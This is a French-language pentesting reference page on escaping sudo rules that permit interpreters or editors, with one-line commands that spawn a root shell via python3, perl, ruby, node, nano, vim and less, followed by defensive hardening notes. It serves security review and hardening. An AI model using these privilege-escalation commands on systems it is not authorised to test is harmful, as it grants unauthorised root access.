# Abus de commandes Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpréteurs autorisés par Sudo

Si `sudo -l` permet à un utilisateur d’exécuter un interpréteur en tant que root, considérez cela comme une exécution directe de code. Les interpréteurs sont conçus pour exécuter du code arbitraire. Ainsi, une règle autorisant les binaires `python3`, `perl`, `ruby`, `lua`, `node` ou similaires équivaut généralement à l’exécution de commandes root, sauf si les arguments sont strictement limités et validés.

Processus courant de revue :
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Autres exemples d’interpréteurs :
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Le chemin exact est important. Si la règle sudo autorise `/usr/bin/python3`, utilisez ce chemin exact lors de la validation :
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Éditeurs autorisés par Sudo

Si `sudo -l` autorise un utilisateur à exécuter un éditeur interactif en tant que root, considérez cela comme une surface d’exécution de commandes, et non comme une autorisation inoffensive de modification de fichiers. Les éditeurs peuvent souvent exécuter des commandes shell, lire des fichiers arbitraires, écrire dans des fichiers arbitraires ou invoquer des helpers externes depuis l’éditeur.

Flux d’examen courant :
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Exécution de commandes avec Nano

Lorsque `nano` est autorisé via sudo, l’exécution de commandes peut être accessible depuis l’interface de l’éditeur :
```text
Ctrl+R
Ctrl+X
```
Fournissez ensuite une commande telle que :
```bash
id
/bin/sh
```
Sur certains terminaux, un shell interactif peut nécessiter la redirection des flux standard :
```bash
reset; /bin/sh 1>&0 2>&0
```
La séquence exacte de touches peut varier selon la version de nano et les options de compilation, mais le problème de sécurité reste le même : l’éditeur s’exécute en tant que root et peut invoquer des commandes externes.

### Autres échappements courants depuis les éditeurs

Les éditeurs de type Vim permettent généralement d’exécuter des commandes via `:!`:
```text
:!/bin/sh
```
Les pagers tels que `less` peuvent également exposer l’exécution de commandes shell :
```text
!/bin/sh
```
## Notes défensives

- Évitez d’autoriser les interpréteurs ou les éditeurs interactifs via sudo.
- Préférez des wrappers fixes, appartenant à root, qui exécutent une seule action administrative précise.
- Si l’utilisation d’un interpréteur est inévitable, limitez le chemin exact du script et empêchez les arguments contrôlés par l’utilisateur, les imports accessibles en écriture, `PYTHONPATH` et la préservation d’un environnement non sûr.
- Si la modification de fichiers est nécessaire, limitez le chemin exact du fichier et envisagez `sudoedit` avec des versions corrigées de sudo et une gestion stricte de l’environnement.
- Examinez `SETENV`, `env_keep`, les répertoires de travail accessibles en écriture, les chemins de modules/imports accessibles en écriture, `NOEXEC`, `use_pty` et la journalisation, mais ne les considérez pas comme un sandbox complet.
{{#include ../../banners/hacktricks-training.md}}
